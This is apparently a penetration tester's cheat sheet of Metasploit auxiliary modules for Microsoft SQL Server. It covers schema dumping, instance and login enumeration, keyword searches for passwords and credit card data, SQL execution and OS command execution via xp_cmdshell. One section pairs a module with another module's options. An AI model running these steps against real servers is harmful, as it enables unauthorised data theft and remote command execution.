# Metasploit

TODO: Re-arrange from this section to post exploitation under **Enumeration and Discovery**

### 4.1 - Database

#### 4.1.1 - Schema

```
msf > use auxiliary/scanner/mssql/mssql_schemadump

msf auxiliary(scanner/mssql/mssql_schemadump) > options

Module options (auxiliary/scanner/mssql/mssql_schemadump):

   Name                 Current Setting  Required  Description
   ----                 ---------------  --------  -----------
   DISPLAY_RESULTS      true             yes       Display the Results to the Screen
   USE_WINDOWS_AUTHENT  false            yes       Use windows authentication (requires DOMAIN option set)


   Used when making a new connection via RHOSTS:

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   DATABASE  MSSQL            no        The database to authenticate against
   PASSWORD                   no        The password for the specified username
   RHOSTS                     no        The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT     1433             no        The target port (TCP)
   THREADS   1                yes       The number of concurrent threads (max one per host)
   USERNAME  MSSQL            no        The username to authenticate as


   Used when connecting via an existing SESSION:

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   no        The session to run this module on


View the full module info with the info, or info -d command.

msf auxiliary(scanner/mssql/mssql_schemadump) > set rhosts <IP>

msf auxiliary(scanner/mssql/mssql_schemadump) > set username <username>

msf auxiliary(scanner/mssql/mssql_schemadump) > set password <password>

msf auxiliary(scanner/mssql/mssql_schemadump) > run
```

#### 4.1.2 - Enumerate Instances

```
msf > use auxiliary/admin/mssql/mssql_enum

msf auxiliary(admin/mssql/mssql_enum) > options

Module options (auxiliary/admin/mssql/mssql_enum):

   Name                 Current Setting  Required  Description
   ----                 ---------------  --------  -----------
   USE_WINDOWS_AUTHENT  false            yes       Use windows authentication (requires DOMAIN option set)


   Used when making a new connection via RHOSTS:

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   DATABASE  MSSQL            no        The database to authenticate against
   PASSWORD                   no        The password for the specified username
   RHOSTS                     no        The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT     1433             no        The target port (TCP)
   USERNAME  MSSQL            no        The username to authenticate as


   Used when connecting via an existing SESSION:

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   no        The session to run this module on


View the full module info with the info, or info -d command.

msf auxiliary(admin/mssql/mssql_enum) > set rhosts <IP>

msf auxiliary(admin/mssql/mssql_enum) > set database <database>

msf auxiliary(admin/mssql/mssql_enum) > set username <username>

msf auxiliary(admin/mssql/mssql_enum) > set password <password>

msf auxiliary(admin/mssql/mssql_enum) > run
```

#### 4.1.3 - Dumping Database

```
msf > use auxiliary/admin/mssql/mssql_findandsampledata

msf auxiliary(admin/mssql/mssql_findandsampledata) > options

Module options (auxiliary/admin/mssql/mssql_findandsampledata):

   Name                 Current Setting    Required  Description
   ----                 ---------------    --------  -----------
   KEYWORDS             passw|credit|card  yes       Keywords to search for
   SAMPLE_SIZE          1                  yes       Number of rows to sample
   USE_WINDOWS_AUTHENT  false              yes       Use windows authentication (requires DOMAIN option set)


   Used when making a new connection via RHOSTS:

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   DATABASE  MSSQL            no        The database to authenticate against
   PASSWORD                   no        The password for the specified username
   RHOSTS                     no        The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT     1433             no        The target port (TCP)
   THREADS   1                yes       The number of concurrent threads (max one per host)
   USERNAME  MSSQL            no        The username to authenticate as


   Used when connecting via an existing SESSION:

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   no        The session to run this module on


View the full module info with the info, or info -d command.

msf auxiliary(admin/mssql/mssql_findandsampledata) > set rhosts <IP>

msf auxiliary(admin/mssql/mssql_findandsampledata) > set threads 4

msf auxiliary(admin/mssql/mssql_findandsampledata) > set username <username>

msf auxiliary(admin/mssql/mssql_findandsampledata) > set password <password>

msf auxiliary(admin/mssql/mssql_findandsampledata) > set sample_size 8

msf auxiliary(admin/mssql/mssql_findandsampledata) > set keywords <keyword1>|<keyword2>|<keyword3>

msf auxiliary(admin/mssql/mssql_findandsampledata) > exploit
```

### 4.2 - SQL Queries

#### 4.2.1 - Execute SQL Queries

```
msf > use auxiliary/admin/mssql/mssql_sql

msf auxiliary(admin/mssql/mssql_sql) > options

Module options (auxiliary/admin/mssql/mssql_sql):

   Name                 Current Setting   Required  Description
   ----                 ---------------   --------  -----------
   SQL                  select @@version  no        The SQL query to execute
   USE_WINDOWS_AUTHENT  false             yes       Use windows authentication (requires DOMAIN option set)


   Used when making a new connection via RHOSTS:

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   DATABASE  MSSQL            no        The database to authenticate against
   PASSWORD                   no        The password for the specified username
   RHOSTS                     no        The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT     1433             no        The target port (TCP)
   USERNAME  MSSQL            no        The username to authenticate as


   Used when connecting via an existing SESSION:

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   no        The session to run this module on


View the full module info with the info, or info -d command.

msf auxiliary(admin/mssql/mssql_sql) > set rhosts <IP>

msf auxiliary(admin/mssql/mssql_sql) > set sql <query>

msf auxiliary(admin/mssql/mssql_sql) > set username <username>

msf auxiliary(admin/mssql/mssql_sql) > set password <password>

msf auxiliary(admin/mssql/mssql_sql) > run
```

#### 4.2.2 - Enumerate Users

```
msf > use auxiliary/admin/mssql/mssql_enum_sql_logins

msf auxiliary(admin/mssql/mssql_enum_sql_logins) > options

Module options (auxiliary/admin/mssql/mssql_enum_sql_logins):

   Name                 Current Setting  Required  Description
   ----                 ---------------  --------  -----------
   FuzzNum              300              yes       Number of principal_ids to fuzz.
   PASSWORD                              no        The password for the specified username
   RHOSTS                                yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT                1433             yes       The target port (TCP)
   TDSENCRYPTION        false            yes       Use TLS/SSL for TDS data "Force Encryption"
   USERNAME             sa               no        The username to authenticate as
   USE_WINDOWS_AUTHENT  false            yes       Use windows authentification (requires DOMAIN option set)

msf auxiliary(admin/mssql/mssql_enum_sql_logins) > set rhosts <IP>

msf auxiliary(admin/mssql/mssql_enum_sql_logins) > set username <username>

msf auxiliary(admin/mssql/mssql_enum_sql_logins) > set password <password>

msf auxiliary(admin/mssql/mssql_enum_sql_logins) > run
```

#### 4.2.3 - Domain Accounts

```
msf > use auxiliary/admin/mssql/mssql_enum_domain_accounts

msf auxiliary(admin/mssql/mssql_enum_domain_accounts) > options

Module options (auxiliary/admin/mssql/mssql_sql_file):

   Name                 Current Setting  Required  Description
   ----                 ---------------  --------  -----------
   QUERY_PREFIX                          no        string to append each line of the file
   QUERY_SUFFIX                          no        string to prepend each line of the file
   SQL_FILE                              yes       File containing multiple SQL queries execute (one per line)
   USE_WINDOWS_AUTHENT  false            yes       Use windows authentication (requires DOMAIN option set)


   Used when making a new connection via RHOSTS:

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   DATABASE  MSSQL            no        The database to authenticate against
   PASSWORD                   no        The password for the specified username
   RHOSTS                     no        The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT     1433             no        The target port (TCP)
   USERNAME  MSSQL            no        The username to authenticate as


   Used when connecting via an existing SESSION:

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   no        The session to run this module on


View the full module info with the info, or info -d command.

msf auxiliary(admin/mssql/mssql_enum_domain_accounts) > set rhosts <IP>

msf auxiliary(admin/mssql/mssql_enum_domain_accounts) > set username <username>

msf auxiliary(admin/mssql/mssql_enum_domain_accounts) > set password <password>

msf auxiliary(admin/mssql/mssql_enum_domain_accounts) > run
```

#### 4.2.4 - Read File

```
msf > auxiliary/admin/mssql/mssql_sql_file

msf auxiliary(admin/mssql/mssql_sql_file) > options

Module options (auxiliary/admin/mssql/mssql_sql_file):
 
   Name                 Current Setting  Required  Description
   ----                 ---------------  --------  -----------
   PASSWORD                              no        The password for the specified username
   QUERY_PREFIX                          no        string to append each line of the file
   QUERY_SUFFIX                          no        string to prepend each line of the file
   RHOSTS                                yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT                1433             yes       The target port (TCP)
   SQL_FILE                              yes       File containing multiple SQL queries execute (one per line)
   TDSENCRYPTION        false            yes       Use TLS/SSL for TDS data "Force Encryption"
   USERNAME             sa               no        The username to authenticate as
   USE_WINDOWS_AUTHENT  false            yes       Use windows authentification (requires DOMAIN option set)

msf auxiliary(admin/mssql/mssql_sql_file) > set rhosts <IP>

msf auxiliary(admin/mssql/mssql_sql_file) > set username <username>

msf auxiliary(admin/mssql/mssql_sql_file) > set password <password>

msf auxiliary(admin/mssql/mssql_sql_file) > set sql_file /remote/path/to/file.sql

msf auxiliary(admin/mssql/mssql_sql_file) > run
```

#### 4.2.5 - Execute Commands

```
msf > use auxiliary/admin/mssql/mssql_exec

msf auxiliary(admin/mssql/mssql_exec) > options

Module options (auxiliary/admin/mssql/mssql_exec):

   Name                 Current Setting                       Required  Description
   ----                 ---------------                       --------  -----------
   CMD                  cmd.exe /c echo OWNED > C:\owned.exe  no        Command to execute
   TECHNIQUE            xp_cmdshell                           yes       Technique to use for command execution (Accepted: xp_cmdshell, sp_oacreate)
   USE_WINDOWS_AUTHENT  false                                 yes       Use windows authentication (requires DOMAIN option set)


   Used when making a new connection via RHOSTS:

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   DATABASE  MSSQL            no        The database to authenticate against
   PASSWORD                   no        The password for the specified username
   RHOSTS                     no        The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT     1433             no        The target port (TCP)
   USERNAME  MSSQL            no        The username to authenticate as


   Used when connecting via an existing SESSION:

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   no        The session to run this module on


View the full module info with the info, or info -d command.

msf auxiliary(admin/mssql/mssql_exec) > set rhosts <IP>

msf auxiliary(admin/mssql/mssql_exec) > set username <username>

msf auxiliary(admin/mssql/mssql_exec) > set password <password>

msf auxiliary(admin/mssql/mssql_exec) > set technique <xp_cmdshell | sp_oacreate>

msf auxiliary(admin/mssql/mssql_exec) > set cmd <command> [arguments]

msf auxiliary(admin/mssql/mssql_exec) > run
```

---
## References

- [Hacktricks: Pentesting MSSQL Microsoft SQL Server](https://book.hacktricks.xyz/pentesting/pentesting-mssql-microsoft-sql-server)

- [Hacking Articles: MSSQL for Pentester Command Execution with XP_Cmdshell](https://www.hackingarticles.in/mssql-for-pentester-command-execution-with-xp_cmdshell/)

- [Hacking Articles: MSSQL for Pentester Metasploit](https://www.hackingarticles.in/mssql-for-pentester-metasploit/)

- [Metasploit Unleashed: Admin MSSQL Auxiliary Modules](https://www.offensive-security.com/metasploit-unleashed/admin-mssql-auxiliary-modules/)